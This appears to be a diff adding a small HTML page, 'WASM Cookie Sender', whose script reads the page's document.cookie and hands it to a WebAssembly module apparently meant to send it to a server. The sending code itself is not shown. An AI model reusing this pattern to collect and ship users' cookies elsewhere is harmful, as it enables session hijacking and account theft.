@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WASM Cookie Sender</title>
+    <script>
+        let wasmInstance;
+        
+        async function loadWasm() {
+            try {
+                const response = await fetch("send_to_server.wasm");
+                const bytes = await response.arrayBuffer();
+                const wasmModule = await WebAssembly.instantiate(bytes, {
+                    env: {
+                        memory: new WebAssembly.Memory({ initial: 256, maximum: 512 }),
+                        malloc: (size) => wasmInstance.exports.malloc(size),
+                        free: (ptr) => wasmInstance.exports.free(ptr),
+                    }
+                });
+                
+                wasmInstance = wasmModule.instance;
+                console.log("WASM Module Loaded");
+            } catch (error) {
+                console.error("Failed to load WASM module:", error);
+            }
+        }
+        
+        function sendCookieToWasm() {
+            if (wasmInstance && wasmInstance.exports.send_cookie) {
+                const cookie = document.cookie;
+                console.log("Sending cookie to WASM:", cookie);
+                const encoder = new TextEncoder();
+                const memory = new Uint8Array(wasmInstance.exports.memory.buffer);
+                const ptr = wasmInstance.exports.malloc(cookie.length + 1);
+                
+                memory.set(encoder.encode(cookie), ptr);
+                memory[ptr + cookie.length] = 0; // Null terminator
+                
+                wasmInstance.exports.send_cookie(ptr);
+                wasmInstance.exports.free(ptr);
+            } else {
+                console.error("WASM Module is not loaded or missing send_cookie function.");
+            }
+        }
+        
+        window.onload = loadWasm;
+    </script>
+</head>
+<body>
+    <h1>WebAssembly Cookie Sender</h1>
+    <button onclick="sendCookieToWasm()">Send Cookies</button>
+</body>
+</html>
